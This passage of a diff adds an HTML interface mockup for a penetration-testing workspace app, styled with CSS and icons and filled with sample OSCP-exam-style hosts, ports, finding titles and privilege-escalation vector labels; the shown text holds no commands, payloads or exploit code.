@@ -1,0 +1,356 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Raven Workspace: engagement IDE</title>
+<script src="./support.js"></script>
+<link rel="stylesheet" href="raven-tokens.css">
+<link rel="stylesheet" href="ds/raven/components/bundle.css">
+<script src="ds/raven/components/bundle.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<style>
+body{margin:0;background:#000}
+a{color:#c4c4c4}a:hover{color:#ffffff}
+.mono{font-family:var(--font-mono);font-variant-ligatures:none;font-feature-settings:"liga" 0,"calt" 0}
+.rail-btn{display:inline-grid;place-items:center;width:28px;height:28px;padding:0;margin:0;border:0;border-radius:6px;background:transparent;color:#a8a8a8}
+.rail-btn:hover{background:#111111;color:#ffffff}
+.tab{display:grid;grid-template-columns:max-content 28px;align-items:center;gap:4px;height:40px;padding:0 4px 0 12px;border:0;background:transparent;color:#a8a8a8;font:inherit;font-size:13px;line-height:18px;position:relative}
+.term-tab{display:grid;grid-template-columns:16px max-content;align-items:center;gap:8px;height:36px;padding:0 12px;border:0;background:transparent;color:#a8a8a8;font:inherit;font-size:13px;line-height:18px;position:relative}
+.tree-row{display:grid;grid-template-columns:16px minmax(0,1fr) max-content;align-items:center;gap:8px;min-height:36px;padding:0 12px 0 16px;position:relative;color:#e8e8e8;font-size:14px;line-height:20px}
+.ic{display:block;flex-shrink:0}
+.mark{position:absolute;left:8px;right:8px;bottom:-1px;height:2px;background:#c6ff00}
+.fg-head{display:grid;grid-template-columns:16px minmax(0,1fr);align-items:center;gap:8px;min-height:28px;padding:0;border:0;background:transparent;color:#e8e8e8;font:inherit;text-align:left;width:100%}
+.fg-sum{display:block;padding-left:24px;font-size:13px;line-height:18px;color:#c4c4c4;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.kv{display:grid;grid-template-columns:64px minmax(0,1fr);gap:8px;align-items:start;min-height:28px;padding-top:4px;font-size:13px;line-height:18px}
+.vec{display:grid;grid-template-columns:minmax(0,1fr) max-content;gap:8px;align-items:center;min-height:36px;border-bottom:1px solid #1f1f1f}
+.htab{position:relative;display:inline-grid;grid-auto-flow:column;align-items:center;height:36px;padding:0 12px;border:0;background:transparent;color:#c4c4c4;font:inherit;font-size:14px;line-height:20px;font-weight:500}
+.htab[aria-selected="true"]{color:#ffffff}
+.goal{display:grid;grid-template-columns:16px minmax(0,1fr);gap:8px;align-items:start;padding:12px 0;border-bottom:1px solid #1f1f1f}
+.cmd{display:grid;grid-template-columns:minmax(0,1fr) 28px 28px;align-items:start;gap:8px;padding:8px;border:1px solid #1f1f1f;border-radius:6px;background:#0b0b0b}
+.cmd__t{margin:0;padding-top:4px;font-family:var(--font-mono);font-variant-ligatures:none;font-size:13px;line-height:20px;color:#e8e8e8;white-space:pre-wrap;overflow-wrap:anywhere}
+</style>
+</helmet>
+
+<div style="width: 100%; height: 900px; box-sizing: border-box; padding: 0 8px 8px 0; display: grid; grid-template-rows: 38px minmax(0, 1fr); background: #000000; color: #e8e8e8; font-family: var(--font-ui); font-size: 14px; line-height: 20px;">
+  <!-- Window chrome: system controls, then the old top bar's content (drag region) -->
+  <header data-tauri-drag-region="" style="display: grid; grid-template-columns: 312px max-content minmax(0, 1fr) max-content; align-items: center; gap: 16px; padding-right: 0;">
+    <div style="padding-left: 20px;"><div aria-hidden="true" title="macOS window controls, drawn by the system" style="display: grid; grid-template-columns: 12px 12px 12px; gap: 8px; align-items: center;"><span style="width: 12px; height: 12px; border-radius: 9999px; background: #3a3a3a;"></span><span style="width: 12px; height: 12px; border-radius: 9999px; background: #3a3a3a;"></span><span style="width: 12px; height: 12px; border-radius: 9999px; background: #3a3a3a;"></span></div></div>
+      <div style="display: grid; grid-template-columns: max-content max-content; gap: 8px; align-items: center;">
+        <x-import component-from-global-scope="Raven.PickerTrigger" prefix="Engagement" value="OSCP exam sim 2"></x-import>
+        <x-import component-from-global-scope="Raven.PickerTrigger" prefix="Target" value="forge"></x-import>
+      </div>
+      <div style="display: grid;">
+        <button style="display: grid; grid-template-columns: 16px minmax(0, 1fr) max-content; align-items: center; gap: 8px; width: 100%; height: 32px; padding: 0 8px 0 12px; border: 1px solid #2a2a2a; border-radius: 6px; background: #000000; color: #8a8a8a; font: inherit; font-size: 14px; text-align: left;">
+          <x-import component-from-global-scope="Raven.Icon" name="MagnifyingGlass"></x-import>
+          <span>Search hosts, notes and commands</span>
+          <x-import component-from-global-scope="Raven.Kbd" variant="inline">⌘K</x-import>
+        </button>
+      </div>
+      <x-import component-from-global-scope="Raven.Button" variant="primary" size="md">Build report</x-import>
+      </header>
+<div style="display: grid; grid-template-columns: 56px minmax(0, 1fr); min-height: 0;">
+
+  <!-- Rail: sits in the gutter, outside the curved frame -->
+  <nav aria-label="Workspace" style="display: grid; grid-template-rows: max-content max-content minmax(0, 1fr) max-content; justify-items: center; padding: 0; gap: 16px;">
+    <a href="#" aria-label="Raven home" style="display: grid; place-items: center; width: 40px; height: 40px; border-radius: 6px;"><svg role="img" aria-label="Raven" width="20" height="15" viewBox="290 36 287.7 213.3"><path fill="#ffffff" d="M290.03 36 L507.88 36 A61.73 61.73 0 0 1 507.88 159.45 L495.26 159.45 L577.72 249.3 L529.66 249.3 L447.2 159.45 L342.4 159.45 L342.4 249.3 L305.4 249.3 L305.4 125.85 L502.27 125.85 A28.13 28.13 0 0 0 502.27 69.6 L318.24 69.6Z"></path></svg></a>
+
+    <div style="display: grid; gap: 8px; justify-items: center; width: 56px;">
+      <div style="position: relative; display: grid; place-items: center; width: 56px; height: 36px;">
+        <div style="position: absolute; left: 0; top: 8px; width: 2px; height: 20px; background: #c6ff00; border-radius: 0 2px 2px 0;"></div>
+        <button class="rail-btn" aria-label="Explorer" style="color: #ffffff;"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"><path d="M3 1.5h6l3.5 3.5v9.5H3z"></path><path d="M9 1.5V5h3.5"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Terminals"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round" stroke-linecap="round"><rect x="1.5" y="2.5" width="13" height="11" rx="1.5"></rect><path d="M4.5 6l2 2-2 2"></path><path d="M8.5 10.5h3"></path></svg></button>
+      </div>
+      <div aria-hidden="true" style="display: grid; grid-template-columns: repeat(3, 4px); gap: 4px; justify-content: center; height: 8px; align-items: center;"><span style="width: 4px; height: 4px; border-radius: 9999px; background: #3a3a3a;"></span><span style="width: 4px; height: 4px; border-radius: 9999px; background: #3a3a3a;"></span><span style="width: 4px; height: 4px; border-radius: 9999px; background: #3a3a3a;"></span></div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Board"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M216,48H40a8,8,0,0,0-8,8V208a16,16,0,0,0,16,16H88a16,16,0,0,0,16-16V160h48v16a16,16,0,0,0,16,16h40a16,16,0,0,0,16-16V56A8,8,0,0,0,216,48ZM88,208H48V128H88Zm0-96H48V64H88Zm64,32H104V64h48Zm56,32H168V128h40Zm0-64H168V64h40Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Log"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M80,64a8,8,0,0,1,8-8H216a8,8,0,0,1,0,16H88A8,8,0,0,1,80,64Zm136,56H88a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Zm0,64H88a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16ZM44,52A12,12,0,1,0,56,64,12,12,0,0,0,44,52Zm0,64a12,12,0,1,0,12,12A12,12,0,0,0,44,116Zm0,64a12,12,0,1,0,12,12A12,12,0,0,0,44,180Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <x-import component-from-global-scope="Raven.IconButton" icon="Key" label="Credentials" shortcut="3"></x-import>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Findings"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round" stroke-linecap="round"><path d="M3.5 14.5V2h8.5l-2 3.25 2 3.25H3.5"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Network"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M176,160a39.89,39.89,0,0,0-28.62,12.09l-46.1-29.63a39.8,39.8,0,0,0,0-28.92l46.1-29.63a40,40,0,1,0-8.66-13.45l-46.1,29.63a40,40,0,1,0,0,55.82l46.1,29.63A40,40,0,1,0,176,160Zm0-128a24,24,0,1,1-24,24A24,24,0,0,1,176,32ZM64,152a24,24,0,1,1,24-24A24,24,0,0,1,64,152Zm112,72a24,24,0,1,1,24-24A24,24,0,0,1,176,224Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Engagement checklist"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M224,128a8,8,0,0,1-8,8H128a8,8,0,0,1,0-16h88A8,8,0,0,1,224,128ZM128,72h88a8,8,0,0,0,0-16H128a8,8,0,0,0,0,16Zm88,112H128a8,8,0,0,0,0,16h88a8,8,0,0,0,0-16ZM82.34,42.34,56,68.69,45.66,58.34A8,8,0,0,0,34.34,69.66l16,16a8,8,0,0,0,11.32,0l32-32A8,8,0,0,0,82.34,42.34Zm0,64L56,132.69,45.66,122.34a8,8,0,0,0-11.32,11.32l16,16a8,8,0,0,0,11.32,0l32-32a8,8,0,0,0-11.32-11.32Zm0,64L56,196.69,45.66,186.34a8,8,0,0,0-11.32,11.32l16,16a8,8,0,0,0,11.32,0l32-32a8,8,0,0,0-11.32-11.32Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Field notes"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M229.66,58.34l-32-32a8,8,0,0,0-11.32,0l-96,96A8,8,0,0,0,88,128v32a8,8,0,0,0,8,8h32a8,8,0,0,0,5.66-2.34l96-96A8,8,0,0,0,229.66,58.34ZM124.69,152H104V131.31l64-64L188.69,88ZM200,76.69,179.31,56,192,43.31,212.69,64ZM224,128v80a16,16,0,0,1-16,16H48a16,16,0,0,1-16-16V48A16,16,0,0,1,48,32h80a8,8,0,0,1,0,16H48V208H208V128a8,8,0,0,1,16,0Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <button class="rail-btn" aria-label="Arsenal"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M230.91,172A8,8,0,0,1,228,182.91l-96,56a8,8,0,0,1-8.06,0l-96-56A8,8,0,0,1,36,169.09l92,53.65,92-53.65A8,8,0,0,1,230.91,172ZM220,121.09l-92,53.65L36,121.09A8,8,0,0,0,28,134.91l96,56a8,8,0,0,0,8.06,0l96-56A8,8,0,1,0,220,121.09ZM24,80a8,8,0,0,1,4-6.91l96-56a8,8,0,0,1,8.06,0l96,56a8,8,0,0,1,0,13.82l-96,56a8,8,0,0,1-8.06,0l-96-56A8,8,0,0,1,24,80Zm23.88,0L128,126.74,208.12,80,128,33.26Z"></path></svg></button>
+      </div>
+      <div style="display: grid; place-items: center; width: 56px; height: 36px;">
+        <x-import component-from-global-scope="Raven.IconButton" icon="BookOpenText" label="Manual" shortcut="M"></x-import>
+      </div>
+    </div>
+
+    <div></div>
+
+    <div style="display: grid; justify-items: center; gap: 16px; padding-bottom: 8px;">
+      <div style="display: grid; gap: 8px; justify-items: center;">
+        <x-import component-from-global-scope="Raven.IconButton" icon="Question" label="Shortcuts" shortcut="?"></x-import>
+        <x-import component-from-global-scope="Raven.IconButton" icon="Lock" label="Lock" shortcut="⌘L"></x-import>
+        <x-import component-from-global-scope="Raven.IconButton" icon="Gear" label="Settings" shortcut="⌘,"></x-import>
+      </div>
+    </div>
+  </nav>
+
+  <!-- The curved frame -->
+  <div style="display: grid; grid-template-rows: minmax(0, 1fr) 36px; border: 1px solid #1f1f1f; border-radius: {{frameRadius}}px; overflow: hidden; background: #000000; min-width: 0;">
+
+
+    <!-- Body -->
+    <div class="ws-body" style="display: grid; grid-template-columns: 264px minmax(0, 1fr); min-height: 0;">
+
+      <!-- Explorer -->
+      <aside class="ws-explorer" aria-label="Explorer" style="display: grid; grid-template-rows: 40px minmax(0, 1fr); border-right: 1px solid #1f1f1f; min-height: 0;">
+        <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; padding: 0 8px 0 16px; border-bottom: 1px solid #1f1f1f;">
+          <h2 class="section-label">Explorer</h2>
+        </div>
+        <div style="display: grid; align-content: start; gap: 8px; padding: 8px 0; overflow: auto;">
+
+          <div>
+            <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; min-height: 28px; padding: 0 8px 0 16px;"><span class="section-label">Hosts (3)</span><x-import component-from-global-scope="Raven.IconButton" icon="Plus" label="Add host" shortcut="⌘N"></x-import></div>
+            <div class="tree-row" style="min-height: 44px; grid-template-columns: 16px 16px minmax(0, 1fr) max-content; background: #111111;">
+              <div style="position: absolute; left: 0; top: 0; bottom: 0; width: 2px; background: #c6ff00;"></div>
+              <x-import component-from-global-scope="Raven.Icon" name="CaretDown"></x-import>
+              <span role="img" aria-label="Privilege escalation" style="display: grid; place-items: center; width: 16px; height: 16px; color: #c4c4c4;"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="1.5"></circle><path d="M8 8V3A5 5 0 1 1 3 8Z"></path></svg></span>
+              <span style="display: grid; min-width: 0;"><span style="color: #ffffff; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">forge</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #8a8a8a;">10.10.11.42</span></span>
+              <x-import component-from-global-scope="Raven.Chip" variant="accent">user</x-import>
+            </div>
+            <div style="display: grid; padding-left: 64px;">
+              <div style="display: grid; grid-template-columns: 40px minmax(0, 1fr); min-height: 28px; align-items: center; font-size: 13px; line-height: 18px; color: #c4c4c4;"><span class="mono">22</span><span>ssh</span></div>
+              <div style="display: grid; grid-template-columns: 40px minmax(0, 1fr); min-height: 28px; align-items: center; font-size: 13px; line-height: 18px; color: #c4c4c4;"><span class="mono">80</span><span>http</span></div>
+              <div style="display: grid; grid-template-columns: 40px minmax(0, 1fr); min-height: 28px; align-items: center; font-size: 13px; line-height: 18px; color: #a8a8a8;"><span class="mono">21</span><span>ftp, filtered</span></div>
+            </div>
+            <div class="tree-row" style="min-height: 44px; grid-template-columns: 16px 16px minmax(0, 1fr) max-content;">
+              <x-import component-from-global-scope="Raven.Icon" name="CaretRight"></x-import>
+              <span role="img" aria-label="Initial foothold" style="display: grid; place-items: center; width: 16px; height: 16px; color: #c4c4c4;"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="1.5"></circle><path d="M8 8V3A5 5 0 0 1 8 13Z"></path></svg></span>
+              <span style="display: grid; min-width: 0;"><span style="color: #e8e8e8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">web02</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #8a8a8a;">10.10.11.51</span></span>
+              <x-import component-from-global-scope="Raven.Chip" variant="accent">user</x-import>
+            </div>
+            <div class="tree-row" style="min-height: 44px; grid-template-columns: 16px 16px minmax(0, 1fr) max-content;">
+              <x-import component-from-global-scope="Raven.Icon" name="CaretRight"></x-import>
+              <span role="img" aria-label="Information gathering" style="display: grid; place-items: center; width: 16px; height: 16px; color: #c4c4c4;"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="1.5"></circle></svg></span>
+              <span style="display: grid; min-width: 0;"><span style="color: #e8e8e8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">db01</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #8a8a8a;">10.10.11.60</span></span>
+              
+            </div>
+          </div>
+
+          <div>
+            <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; min-height: 28px; padding: 0 8px 0 16px;"><span class="section-label">Notes (3)</span><x-import component-from-global-scope="Raven.IconButton" icon="Plus" label="Add note"></x-import></div>
+            <div class="tree-row"><span></span><span>Engagement</span><span></span></div>
+            <div class="tree-row"><span></span><span>forge</span><span></span></div>
+            <div class="tree-row"><span></span><span>web02</span><span></span></div>
+          </div>
+
+          <div>
+            <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; min-height: 28px; padding: 0 8px 0 16px;"><span class="section-label">Findings (2)</span><x-import component-from-global-scope="Raven.IconButton" icon="Plus" label="Add finding"></x-import></div>
+            <div class="tree-row"><span></span><span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">SSRF in upload URL fetch</span><span></span></div>
+            <div class="tree-row"><span></span><span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Sudo rule allows script edit</span><span></span></div>
+          </div>
+
+          <div>
+            <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; min-height: 28px; padding: 0 8px 0 16px;"><span class="section-label">Logs (3)</span><x-import component-from-global-scope="Raven.IconButton" icon="Plus" label="Add log entry" shortcut="L"></x-import></div>
+            <div class="tree-row"><span></span><span>Engagement</span><span></span></div>
+            <div class="tree-row"><span></span><span>forge</span><span></span></div>
+            <div class="tree-row"><span></span><span>web02</span><span></span></div>
+          </div>
+        </div>
+      </aside>
+
+      <!-- Work area: editor over terminal -->
+      <div style="display: grid; grid-template-rows: 40px minmax(0, 1fr) {{terminalHeight}}px; min-width: 0; min-height: 0;">
+
+        <!-- Editor tabs -->
+        <div role="tablist" aria-label="Open editors" style="display: grid; grid-auto-flow: column; justify-content: start; align-items: end; border-bottom: 1px solid #1f1f1f; padding-left: 4px;">
+          <div class="tab" role="tab" aria-selected="true" style="color: #ffffff;">
+            <span>forge</span>
+            <x-import component-from-global-scope="Raven.IconButton" icon="X" label="Close tab" shortcut="⌘W"></x-import>
+            <div style="position: absolute; left: 8px; right: 8px; bottom: -1px; height: 2px; background: #c6ff00;"></div>
+          </div>
+          <div class="tab" role="tab" aria-selected="false">
+            <span>Notes: forge</span>
+            <x-import component-from-global-scope="Raven.IconButton" icon="X" label="Close tab" shortcut="⌘W"></x-import>
+          </div>
+          <div class="tab" role="tab" aria-selected="false">
+            <span>SSRF in upload URL fetch</span>
+            <x-import component-from-global-scope="Raven.IconButton" icon="X" label="Close tab" shortcut="⌘W"></x-import>
+          </div>
+        </div>
+
+        <!-- Editor: host view -->
+        <main style="display: grid; grid-template-rows: max-content minmax(0, 1fr); gap: 16px; padding: 24px; overflow: auto; min-height: 0;">
+          <section aria-label="Host" style="display: grid; grid-template-columns: max-content 28px minmax(0, 1fr); align-items: center; gap: 8px;">
+            <h1 style="margin: 0; font-size: 20px; line-height: 28px; font-weight: 600; color: #ffffff;">forge</h1>
+            <x-import component-from-global-scope="Raven.IconButton" icon="PencilSimple" label="Edit host"></x-import>
+            <div style="display: grid; grid-auto-flow: column; justify-content: start; align-items: center; gap: 8px; padding-left: 8px;">
+              <span class="mono" style="font-size: 13px; line-height: 20px;">10.10.11.42</span>
+              <span style="display: grid; grid-template-columns: 16px max-content; gap: 4px; align-items: center; font-size: 13px; line-height: 18px; color: #c4c4c4;"><svg class="ic" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 00-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071.771-.06 1.592-.536 2.257-1.306.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.357.357 0 00-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139zm.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105a.086.086 0 01-.004-.021l-.004-.024a1.807 1.807 0 01-.15.706.953.953 0 01-.213.335.71.71 0 00-.088-.042c-.104-.045-.198-.064-.284-.133a1.312 1.312 0 00-.22-.066c.05-.06.146-.133.183-.198.053-.128.082-.264.088-.402v-.02a1.21 1.21 0 00-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 00-.205.334 1.18 1.18 0 00-.09.4v.019c.002.089.008.179.02.267-.193-.067-.438-.135-.607-.202a1.635 1.635 0 01-.018-.2v-.02a1.772 1.772 0 01.15-.768c.082-.22.232-.406.43-.533a.985.985 0 01.594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2.012-.09.013-.18.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.613.613 0 00-.166-.267.248.248 0 00-.183-.064h-.021c-.071.006-.13.04-.186.132a.552.552 0 00-.12.27.944.944 0 00-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268.01.009.02.018.034.024-.07.057-.117.07-.176.136a.304.304 0 01-.131.068 2.62 2.62 0 01-.275-.402 1.772 1.772 0 01-.155-.667 1.759 1.759 0 01.08-.668 1.43 1.43 0 01.283-.535c.128-.133.26-.2.418-.2zm1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.571.571 0 01.016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.139 1.139 0 01-.448-.067 3.566 3.566 0 01-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71-.07-.268-.005-.47.193-.6.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.645 2.645 0 00-.402-.533 1.45 1.45 0 00-.275-.333c.182 0 .338-.03.465-.067a.615.615 0 00.314-.334c.108-.267 0-.697-.345-1.163-.345-.467-.931-.995-1.788-1.521-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.123 8.123 0 01.647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335.039.003.075.006.11.006.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01c.053 0 .105.005.157.014.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602-.369-.066-.61-.2-.723-.4-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336zm7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8.097 8.097 0 01-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065zm-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"></path></svg>Linux</span>
+              <x-import component-from-global-scope="Raven.Chip" variant="accent">user</x-import>
+              <x-import component-from-global-scope="Raven.Chip">Privilege escalation</x-import>
+              <x-import component-from-global-scope="Raven.Chip">2 threads</x-import>
+            </div>
+          </section>
+
+          <div class="ws-host" style="display: grid; grid-template-columns: minmax(16rem, 1fr) minmax(0, 1.4fr); gap: 24px; min-height: 0;">
+            <div class="ws-facts" role="region" aria-label="Facts" style="display: grid; align-content: start; gap: 12px; min-height: 0; overflow: hidden;">
+              <div>
+                <button class="fg-head" aria-expanded="true"><span style="display: grid; transform: rotate(90deg);"><svg class="ic" width="16" height="16" viewBox="0 0 256 256" fill="currentColor" aria-hidden="true"><path d="M181.66,133.66l-80,80a8,8,0,0,1-11.32-11.32L164.69,128,90.34,53.66a8,8,0,0,1,11.32-11.32l80,80A8,8,0,0,1,181.66,133.66Z"></path></svg></span><span class="section-label">Identity</span></button>
+                <div style="padding-left: 24px;">
+                  <div class="kv"><span style="color: #c4c4c4;">User</span><span class="mono">www-data</span></div>
+                  <div class="kv"><span style="color: #c4c4c4;">Entry</span><span>Apache on 80</span></div>
+                </div>
+              </div>
+              <div>
+                <button class="fg-head" aria-expanded="true"><span style="display: grid; transform: rotate(90deg);"><svg class="ic" width="16" height="16" viewBox="0 0 256 256" fill="currentColor" aria-hidden="true"><path d="M181.66,133.66l-80,80a8,8,0,0,1-11.32-11.32L164.69,128,90.34,53.66a8,8,0,0,1,11.32-11.32l80,80A8,8,0,0,1,181.66,133.66Z"></path></svg></span><span class="section-label">Privesc vectors (2)</span></button>
+                <div style="padding-left: 24px; border-top: 1px solid #1f1f1f; margin-top: 4px;">
+                  <div class="vec"><span class="mono" style="font-size: 13px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">sudo: /usr/bin/python3 /opt/scripts/backup.py</span><x-import component-from-global-scope="Raven.Chip">try</x-import></div>
+                  <div class="vec"><span class="mono" style="font-size: 13px;">SUID: /usr/bin/find</span><x-import component-from-global-scope="Raven.Chip">untested</x-import></div>
+                </div>
+              </div>
+              <div>
+                <button class="fg-head" aria-expanded="false"><svg class="ic" width="16" height="16" viewBox="0 0 256 256" fill="currentColor" aria-hidden="true"><path d="M181.66,133.66l-80,80a8,8,0,0,1-11.32-11.32L164.69,128,90.34,53.66a8,8,0,0,1,11.32-11.32l80,80A8,8,0,0,1,181.66,133.66Z"></path></svg><span class="section-label">Services</span></button>
+                <span class="fg-sum">3 services <span style="margin-left: 16px; color: #c6ff00;">2 confirmed</span><span style="margin-left: 16px;">entry: <span style="color: #e8e8e8;">Apache on 80</span></span></span>
+              </div>
+            </div>
+
+            <div style="display: grid; grid-template-rows: 36px minmax(0, 1fr); min-width: 0; min-height: 0;">
+              <div style="display: grid; grid-template-columns: minmax(0, 1fr) max-content; align-items: center; gap: 12px; border-bottom: 1px solid #1f1f1f;">
